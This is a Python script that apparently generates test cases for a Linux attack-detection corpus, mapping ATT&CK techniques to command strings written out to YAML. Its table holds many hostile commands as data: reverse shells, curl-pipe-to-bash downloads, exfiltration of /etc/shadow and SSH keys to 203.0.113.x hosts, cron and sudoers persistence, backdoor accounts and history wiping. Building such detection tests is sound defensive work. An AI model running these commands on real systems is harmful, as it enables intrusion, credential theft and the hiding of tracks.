#!/usr/bin/env python
# -*- coding: ascii -*-
"""Standalone wave-2 variant generator. Reads the corpus, generates new
cases from the wave-2 shape table below, runs hygiene, outputs a proposal
YAML. Independent from gen_variants.py (which holds wave-1 shapes).

Usage: gen_wave2.py corpus/qinjing.yaml --output proposals/wave2.yaml
"""
import argparse, os, re, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from parse import parse_corpus, cmd_hygiene_errors

W2 = {
 "credential_file_read": ("TA0006","T1552.001",[
  ("more /etc/shadow","none","real","more"),
  ("cut -d: -f1 /etc/passwd","none","real","cut"),
  ("cat /var/lib/sss/db/passwd.ldb","none","real","cat"),
  ("grep -r token /var/lib/","none","real","grep"),
  ("find /var -name *.p12 -type f","none","real","find"),
  ("strings /var/lib/mysql/ibdata1","none","real","strings"),
  ("od -A x -t x1z /root/.ssh/id_rsa","none","real","od"),
 ]),
 "system_discovery": ("TA0007","T1082",[
  ("lsof -i","none","real","lsof"),
  ("lsof -nP","none","real","lsof"),
  ("env","none","sim-builtin","-"),
  ("printenv","none","real","printenv"),
  ("cat /proc/self/environ","none","real","cat"),
  ("cat /proc/1/cmdline","none","real","cat"),
  ("pstree -p","none","real","pstree"),
  ("vmstat 1 3","none","real","vmstat"),
  ("dmesg | tail -20","none","real","dmesg"),
  ("last reboot","none","real","last"),
  ("getent passwd","none","real","getent"),
  ("getent hosts","none","real","getent"),
  ("cat /proc/net/tcp","none","real","cat"),
  ("cat /proc/net/dev","none","real","cat"),
 ]),
 "net_scan_external": ("TA0043","T1046",[
  ("nmap -sS 203.0.113.20","none","sim-missing-bin","nmap"),
  ("nmap --top-ports 100 203.0.113.20","none","sim-missing-bin","nmap"),
  ("nmap -sV -p 3306 203.0.113.20","none","sim-missing-bin","nmap"),
  ("hping3 -S 203.0.113.20 -p 80","none","sim-missing-bin","hping3"),
  ("nping --tcp -p 443 203.0.113.20","none","sim-missing-bin","nping"),
  ("curl --connect-timeout 2 -k https://203.0.113.20/","none","real","curl"),
  ("nc -vz 203.0.113.20 22","none","real","nc"),
  ("nc -vz 203.0.113.20 3306","none","real","nc"),
 ]),
 "suspicious_interpreter_exec": ("TA0002","T1059",[
  ("python -c 'import subprocess; subprocess.call([\"id\"])'","none","real","python"),
  ("python3 -c 'import subprocess; print(subprocess.check_output([\"id\"]).decode())'","none","sim-missing-bin","python3"),
  ("python -c 'import os; print(os.popen(\"whoami\").read())'","none","real","python"),
  ("perl -e 'print `whoami`'","none","real","perl"),
  ("perl -e 'exec(\"/bin/sh\")'","none","real","perl"),
  ("ruby -e 'puts `id`'","none","sim-missing-bin","ruby"),
  ("node -e 'console.log(require(\"os\").userInfo())'","none","sim-missing-bin","node"),
  ("lua -e 'print(pcall(os.execute, \"id\"))'","none","sim-missing-bin","lua"),
  ("python -m py_compile /tmp/qinjing-test.py","none","real","python"),
  ("python -m json.tool /etc/passwd","none","real","python"),
 ]),
 "exfil_transfer": ("TA0010","T1041",[
  ("curl -T /etc/passwd ftp://203.0.113.9/upload/","none","real","curl"),
  ("rsync -az /root/.ssh/ user@203.0.113.9:/tmp/qinjing-ssh/","none","sim-missing-bin","rsync"),
  ("tar czf - /root/ | ssh user@203.0.113.9 'cat > /tmp/qinjing-root.tar'","none","real","tar"),
  ("gzip -c /etc/passwd | nc 203.0.113.9 9999","none","real","gzip"),
  ("xxd /etc/shadow | curl -X POST --data-binary @- http://203.0.113.9/hex","none","real","xxd"),
 ]),
 "persistence_cron_write": ("TA0003","T1053.003",[
  ("echo '0 0 * * * find /tmp -name qinjing-* -delete' >> /etc/crontab","destructive","sim-builtin","-"),
  ("echo '@weekly curl -s http://203.0.113.9/w.sh | bash' >> /var/spool/cron/root","destructive","sim-builtin","-"),
  ("echo '5 4 * * 0 /tmp/qinjing-clean-log' >> /etc/cron.d/qinjing-weekly","destructive","sim-builtin","-"),
 ]),
 "reverse_shell": ("TA0011","T1059.004",[
  ("bash -c 'bash -i >& /dev/tcp/203.0.113.9/1337 0>&1'","destructive","real","bash"),
  ("sh -i >& /dev/tcp/203.0.113.9/4444 0>&1","destructive","sim-builtin","-"),
  ("mkfifo /tmp/qinjing-f; cat /tmp/qinjing-f | /bin/sh -i 2>&1 | nc 203.0.113.9 4444 > /tmp/qinjing-f","temporary","real","nc"),
  ("ncat --ssl -e /bin/sh 203.0.113.9 4444","destructive","sim-missing-bin","ncat"),
  ("bash -i >& /dev/tcp/203.0.113.20/8080 0>&1","destructive","sim-builtin","-"),
  ("socat TCP-LISTEN:4444,fork EXEC:'/bin/sh'","destructive","sim-missing-bin","socat"),
 ]),
 "download_and_execute": ("TA0002","T1059.004",[
  ("curl -sSL http://203.0.113.10/payload.sh | bash","destructive","real","curl"),
  ("wget -qO- http://203.0.113.10/payload.py | python3","destructive","sim-missing-bin","wget"),
  ("curl -sSL https://203.0.113.10/x.sh | sh","destructive","real","curl"),
  ("wget -q http://203.0.113.20/tool.pl -O- | perl","destructive","sim-missing-bin","wget"),
  ("curl -sSL http://203.0.113.20/d.py | python","destructive","real","curl"),
 ]),
 "net_recon_local": ("TA0007","T1049",[
  ("netstat -tulnp","none","real","netstat"),
  ("netstat -a --numeric-ports","none","real","netstat"),
  ("ss -tuln","none","real","ss"),
  ("ss -x","none","real","ss"),
  ("arp -an","none","real","arp"),
  ("ip neigh show","none","real","ip"),
  ("cat /etc/hosts","none","real","cat"),
  ("cat /etc/resolv.conf","none","real","cat"),
  ("dig +short example.com MX","none","sim-missing-bin","dig"),
  ("host -t any example.com","none","sim-missing-bin","host"),
 ]),
 "history_clear": ("TA0005","T1070.003",[
  ("history -c && history -w","none","sim-builtin","-"),
  ("rm -f /root/.bash_history","destructive","real","rm"),
  ("rm -f /home/*/.bash_history","destructive","real","rm"),
  ("echo -n '' > /root/.bash_history","destructive","sim-builtin","-"),
  ("shred -u /root/.bash_history","destructive","sim-missing-bin","shred"),
  ("ln -sf /dev/null /root/.bash_history","destructive","real","ln"),
  ("export HISTFILE=/dev/null","none","sim-builtin","-"),
  ("set +o history","none","sim-builtin","-"),
  ("rm -f /root/.zsh_history","destructive","real","rm"),
  ("rm -f /root/.sh_history","destructive","real","rm"),
 ]),
 "file_attr_lock": ("TA0112","T1222.002",[
  ("chattr +i /etc/passwd","destructive","real","chattr"),
  ("chattr +a /var/log/messages","destructive","real","chattr"),
  ("chattr +i /etc/shadow","destructive","real","chattr"),
  ("chattr +i /etc/sudoers","destructive","real","chattr"),
  ("lsattr -R /etc/","none","real","lsattr"),
  ("chattr -i /etc/passwd","temporary","real","chattr"),
 ]),
 "sniffer_run": ("TA0006","T1040",[
  ("tcpdump -i any -c 10 -w /tmp/qinjing-capture.pcap","temporary","sim-missing-bin","tcpdump"),
  ("tcpdump -i eth0 port 80 -c 5","none","sim-missing-bin","tcpdump"),
  ("tcpdump -i any host 203.0.113.9 -c 3","none","sim-missing-bin","tcpdump"),
  ("tshark -i any -c 5","none","sim-missing-bin","tshark"),
  ("ngrep -d any 'password' port 21","none","sim-missing-bin","ngrep"),
 ]),
 "archive_staging": ("TA0009","T1074.001",[
  ("tar czf /tmp/qinjing-stage.tar.gz /var/log/","temporary","real","tar"),
  ("tar czf /tmp/qinjing-ssh.tar.gz /root/.ssh/","temporary","real","tar"),
  ("zip -r /tmp/qinjing-etc.zip /etc/","temporary","sim-missing-bin","zip"),
  ("tar cjf /tmp/qinjing-home.tar.bz2 /home/","temporary","real","tar"),
  ("7z a /tmp/qinjing-dump.7z /var/lib/mysql/","temporary","sim-missing-bin","7z"),
  ("gzip -k /etc/passwd","temporary","real","gzip"),
  ("xz -k /etc/shadow","temporary","sim-missing-bin","xz"),
 ]),
 "db_mass_dump": ("TA0009","T1005",[
  ("mysqldump --all-databases","none","sim-missing-bin","mysqldump"),
  ("mysqldump -u root mysql","none","sim-missing-bin","mysqldump"),
  ("pg_dumpall","none","sim-missing-bin","pg_dumpall"),
  ("pg_dump -U postgres template1","none","sim-missing-bin","pg_dump"),
  ("sqlite3 /var/lib/qinjing/qj.db .dump","none","sim-missing-bin","sqlite3"),
 ]),
 "account_creation": ("TA0003","T1136.001",[
  ("useradd -m -s /bin/bash qinjing-backdoor","destructive","real","useradd"),
  ("useradd -r -s /sbin/nologin qinjing-svc","destructive","real","useradd"),
  ("adduser --disabled-password --gecos '' qinjing-bot","destructive","sim-missing-bin","adduser"),
  ("usermod -aG wheel qinjing-user","destructive","real","usermod"),
  ("usermod -aG sudo qinjing-user","destructive","real","usermod"),
  ("usermod -s /bin/sh qinjing-alias","destructive","real","usermod"),
  ("passwd -d qinjing-user","destructive","real","passwd"),
 ]),
 "persistence_systemd": ("TA0003","T1543.002",[
  ("systemctl enable httpd","destructive","real","systemctl"),
  ("systemctl enable --now sshd","destructive","real","systemctl"),
  ("systemctl reenable crond","destructive","real","systemctl"),
 ]),
 "sudoers_change": ("TA0004","T1548.003",[
  ("echo 'qinjing ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","destructive","sim-builtin","-"),
  ("echo '%wheel ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/qinjing","destructive","sim-builtin","-"),
  ("visudo -c","none","real","visudo"),
 ]),
 "persistence_ssh_key": ("TA0003","T1098.004",[
  ("ssh-keygen -t ed25519 -f /tmp/qinjing-newkey -N ''","temporary","real","ssh-keygen"),
  ("ssh-copy-id -i /tmp/qinjing-newkey.pub user@203.0.113.9","destructive","real","ssh-copy-id"),
  ("cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys","destructive","real","cat"),
 ]),
}

def esc(t):
    return t.replace("'", "''")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("corpus")
    ap.add_argument("--output", required=True)
    args = ap.parse_args()
    cases = parse_corpus(args.corpus)
    existing = set()
    for sec in ("false_positives","attacks"):
        for c in cases[sec]:
            existing.add(c.get("cmd",""))
    seq = 0
    for c in cases["attacks"]:
        m = re.match(r"VR(\d+)", c.get("id",""))
        if m: seq = max(seq, int(m.group(1)))
    out = []
    dupes = 0; hygiene_rej = 0
    for cls, (tactic, technique, entries) in W2.items():
        for cmd, impact, mode, bin_name in entries:
            if cmd in existing:
                dupes += 1; continue
            probs = cmd_hygiene_errors(cmd, impact)
            if probs:
                hygiene_rej += 1
                print("REJECT [%s]: %s -> %s" % (cls, cmd[:50], probs[0]))
                continue
            seq += 1
            out.append((seq, cls, tactic, technique, cmd, impact, mode, bin_name))
    lines = ["# Wave-2 variants (tools/gen_wave2.py)", ""]
    lines.append("attacks:")
    for s, cls, tac, tech, cmd, imp, mode, bin_ in out:
        lines.append("  - id: VR%03d" % s)
        lines.append("    tactic: %s" % tac)
        lines.append("    technique: %s" % tech)
        lines.append("    name: %s variant w2-%d" % (cls, s))
        lines.append("    platforms: [linux]")
        lines.append("    cmd: '%s'" % esc(cmd))
        lines.append("    bin: '%s'" % bin_)
        lines.append("    creates_process: %s" % ("true" if mode != "sim-builtin" else "false"))
        lines.append("    mode: %s" % mode)
        lines.append("    expected_signals: [%s]" % cls)
        lines.append("    related_signals: []")
        lines.append("    expect: detectable")
        lines.append("    impact: %s" % imp)
    with open(args.output, "w", encoding="ascii", newline="\n") as fh:
        fh.write("\n".join(lines) + "\n")
    print("generated %d (%d dupes, %d hygiene rejects) -> %s" % (len(out), dupes, hygiene_rej, args.output))

if __name__ == "__main__":
    sys.exit(main())
